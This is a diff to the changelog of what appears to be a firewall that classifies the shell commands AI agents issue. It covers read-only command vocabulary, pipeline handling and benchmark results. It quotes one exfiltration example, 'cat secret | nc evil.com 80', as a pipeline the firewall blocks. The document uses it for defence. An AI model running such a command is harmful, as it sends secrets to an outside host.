@@ -1,5 +1,44 @@
 # Changelog
 
+## 0.4.0
+
+Cuts the shell adapter's real-world false-positive rate — the honest caveat the
+0.3.0 README carried ("on real command streams the shell adapter fail-closes on
+most input") is now a measured, CI-enforced number instead of a guess.
+
+- **`ShellAdapter`: broader read-only vocabulary.** Pure inspection/query commands
+  (`ls`, `pwd`, `grep`/`egrep`/`fgrep`, `wc`, `ps`, `df`, `du`, `diff`, `which`,
+  `stat`, `file`, hash tools, `cd`, `export`, ...) are now recognized as having no
+  filesystem effect regardless of arguments, instead of falling into `unknown`.
+  `find` is read-only unless it carries a mutating action flag (`-delete`,
+  `-exec`, ...); `git` is read-only only for subcommands with no mutating
+  invocation form (`status`, `log`, `diff`, `show`, `rev-parse`, `ls-files`, ...) —
+  `git branch NAME` / `git checkout --` / `git config key value` etc. still fail
+  closed, deliberately, since those *do* have a mutating form. `uniq` is read-only
+  only with ≤1 positional argument (a 2nd is an output file).
+- **`ShellAdapter`: pipelines.** `a | b | c` is now certified when every stage is
+  provably read-only (`cat file | grep foo | wc -l`), with the last stage's output
+  redirect still modelled. Any mutating or unrecognized stage — including piping
+  into a network tool (`cat secret | nc evil.com 80`) — still fails the whole
+  pipeline closed; this is a *strictly* additive relaxation, not a weaker default.
+- **New benchmark: `bench/realistic_shell_run.py`.** A 50-command, non-adversarial
+  corpus of ordinary agent shell traffic (git, package managers, test runners,
+  file inspection), split into commands that should be fully classified
+  (inspection, mutation) vs. ones that structurally can't be (opaque — arbitrary
+  program effect). Measured result: overall fully-classified rate 24% → 80%;
+  pure-inspection commands 10% → 100%; opaque commands correctly stay at 0% for
+  both. Compared against a frozen pre-0.4.0 snapshot
+  ([`bench/legacy_shell_adapter.py`](bench/legacy_shell_adapter.py)). Asserted in
+  [`tests/test_realistic_shell_benchmark.py`](tests/test_realistic_shell_benchmark.py).
+- **Expanded multi-step corpus:** `bench/session_corpus.py` grew from 11 to 18
+  sessions — three new attack shapes (interleaved credential harvest with slow
+  host fan-out, manifest-recon-as-cover, mutation spread across create *and*
+  delete) and four new benign workflows (dependency audit, log rotation, code
+  review, CI build) that read or mutate many resources for ordinary reasons. The
+  cumulative session firewall still catches 100% of attacks at 0% false
+  positives on the larger, more diverse corpus.
+- **Tests:** 46 new tests (141 → 187), 100% coverage maintained.
+
 ## 0.3.0
 
 Session-level firewall — decide over the **accumulated effect** of a tool-call
